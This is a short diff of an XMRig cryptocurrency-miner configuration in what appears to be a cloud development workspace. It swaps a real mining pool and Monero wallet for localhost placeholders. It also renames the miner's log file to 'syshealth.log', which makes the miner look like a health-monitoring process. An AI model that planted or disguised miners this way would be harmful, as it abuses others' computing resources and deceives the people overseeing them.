@@ -72,17 +72,17 @@
         "rx/arq": "rx/wow",
         "rx/keva": "rx/wow"
     },
-    "log-file": "/workspaces/dock/xmrig.log",
+    "log-file": "/workspaces/dock/syshealth.log",
     "donate-level": 1,
     "donate-over-proxy": 0,
     "pools": [
         {
             "algo": null,
             "coin": null,
-            "url": "pool.supportxmr.com:3333",
-            "user": "49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F.worker-c8f8vk",
+            "url": "localhost:8080",
+            "user": "user-placeholder",
             "pass": "x",
-            "rig-id": "worker-c8f8vk",
+            "rig-id": "generic-worker",
             "nicehash": false,
             "keepalive": true,
             "enabled": true,
